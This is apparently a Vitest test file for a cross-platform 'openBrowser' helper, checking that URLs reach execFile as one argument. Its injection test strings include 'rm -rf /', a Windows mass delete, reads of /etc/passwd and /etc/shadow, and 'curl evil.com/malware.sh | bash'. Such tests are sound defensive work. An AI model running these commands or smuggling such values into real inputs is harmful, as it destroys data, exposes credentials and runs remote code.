import * as childProcess from 'node:child_process';
import * as os from 'node:os';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { openBrowser } from '../../src/utils/browser.js';

vi.mock('child_process');
vi.mock('os');

describe('openBrowser', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('macOS', () => {
    beforeEach(() => {
      vi.mocked(os.platform).mockReturnValue('darwin');
    });

    it('should open URL using "open" command on macOS', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const result = await openBrowser('https://example.com');

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'open',
        ['https://example.com'],
        expect.any(Function)
      );
      expect(result).toBe(true);
    });

    it('should prevent command injection on macOS', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const maliciousUrl = 'https://example.com"; rm -rf /; "';
      await openBrowser(maliciousUrl);

      // Verify the URL is passed as a single argument, not interpolated into a command
      expect(childProcess.execFile).toHaveBeenCalledWith(
        'open',
        ['https://example.com"; rm -rf /; "'],
        expect.any(Function)
      );
    });

    it('should return false when opening fails on macOS', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(new Error('Command failed'));
        }
      );

      const result = await openBrowser('https://example.com');

      expect(result).toBe(false);
    });
  });

  describe('Windows', () => {
    beforeEach(() => {
      vi.mocked(os.platform).mockReturnValue('win32');
    });

    it('should open URL using cmd.exe on Windows', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const result = await openBrowser('https://example.com');

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'cmd.exe',
        ['/c', 'start', '""', 'https://example.com'],
        expect.any(Function)
      );
      expect(result).toBe(true);
    });

    it('should prevent command injection on Windows', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const maliciousUrl = 'https://example.com" && del /F /Q C:\\* && "';
      await openBrowser(maliciousUrl);

      // Verify the URL is passed as a single argument
      expect(childProcess.execFile).toHaveBeenCalledWith(
        'cmd.exe',
        ['/c', 'start', '""', 'https://example.com" && del /F /Q C:\\* && "'],
        expect.any(Function)
      );
    });

    it('should return false when opening fails on Windows', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(new Error('Command failed'));
        }
      );

      const result = await openBrowser('https://example.com');

      expect(result).toBe(false);
    });
  });

  describe('Linux', () => {
    beforeEach(() => {
      vi.mocked(os.platform).mockReturnValue('linux');
    });

    it('should open URL using xdg-open on Linux', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const result = await openBrowser('https://example.com');

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'xdg-open',
        ['https://example.com'],
        expect.any(Function)
      );
      expect(result).toBe(true);
    });

    it('should prevent command injection on Linux', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const maliciousUrl = 'https://example.com"; cat /etc/passwd; "';
      await openBrowser(maliciousUrl);

      // Verify the URL is passed as a single argument
      expect(childProcess.execFile).toHaveBeenCalledWith(
        'xdg-open',
        ['https://example.com"; cat /etc/passwd; "'],
        expect.any(Function)
      );
    });

    it('should return false when opening fails on Linux', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(new Error('Command failed'));
        }
      );

      const result = await openBrowser('https://example.com');

      expect(result).toBe(false);
    });
  });

  describe('edge cases', () => {
    beforeEach(() => {
      vi.mocked(os.platform).mockReturnValue('darwin');
    });

    it('should handle URLs with special characters', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const specialUrl = 'https://example.com?param=value&other=test#anchor';
      await openBrowser(specialUrl);

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'open',
        ['https://example.com?param=value&other=test#anchor'],
        expect.any(Function)
      );
    });

    it('should handle URLs with spaces', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const urlWithSpaces = 'https://example.com/path with spaces';
      await openBrowser(urlWithSpaces);

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'open',
        ['https://example.com/path with spaces'],
        expect.any(Function)
      );
    });

    it('should handle localhost URLs', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      await openBrowser('http://localhost:3000/auth?code=abc123');

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'open',
        ['http://localhost:3000/auth?code=abc123'],
        expect.any(Function)
      );
    });

    it('should handle empty URL strings', async () => {
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      await openBrowser('');

      expect(childProcess.execFile).toHaveBeenCalledWith(
        'open',
        [''],
        expect.any(Function)
      );
    });
  });

  describe('security', () => {
    it('should not execute shell metacharacters (macOS)', async () => {
      vi.mocked(os.platform).mockReturnValue('darwin');
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const attacks = [
        'https://example.com"; echo "hacked',
        'https://example.com && echo hacked',
        'https://example.com | cat /etc/passwd',
        'https://example.com; ls -la',
        'https://example.com` whoami `',
        'https://example.com$(whoami)',
      ];

      for (const attack of attacks) {
        await openBrowser(attack);

        // Each call should pass the attack string as a safe argument
        expect(childProcess.execFile).toHaveBeenCalledWith(
          'open',
          [attack],
          expect.any(Function)
        );
      }

      expect(childProcess.execFile).toHaveBeenCalledTimes(attacks.length);
    });

    it('should not execute shell metacharacters (Windows)', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const attacks = [
        'https://example.com" && echo hacked',
        'https://example.com | type C:\\secrets.txt',
        'https://example.com & whoami',
      ];

      for (const attack of attacks) {
        await openBrowser(attack);

        expect(childProcess.execFile).toHaveBeenCalledWith(
          'cmd.exe',
          ['/c', 'start', '""', attack],
          expect.any(Function)
        );
      }

      expect(childProcess.execFile).toHaveBeenCalledTimes(attacks.length);
    });

    it('should not execute shell metacharacters (Linux)', async () => {
      vi.mocked(os.platform).mockReturnValue('linux');
      vi.mocked(childProcess.execFile).mockImplementation(
        (_cmd, _args, callback) => {
          callback(null);
        }
      );

      const attacks = [
        'https://example.com"; cat /etc/shadow; "',
        'https://example.com && curl evil.com/malware.sh | bash',
        'https://example.com || rm -rf /',
      ];

      for (const attack of attacks) {
        await openBrowser(attack);

        expect(childProcess.execFile).toHaveBeenCalledWith(
          'xdg-open',
          [attack],
          expect.any(Function)
        );
      }

      expect(childProcess.execFile).toHaveBeenCalledTimes(attacks.length);
    });
  });
});
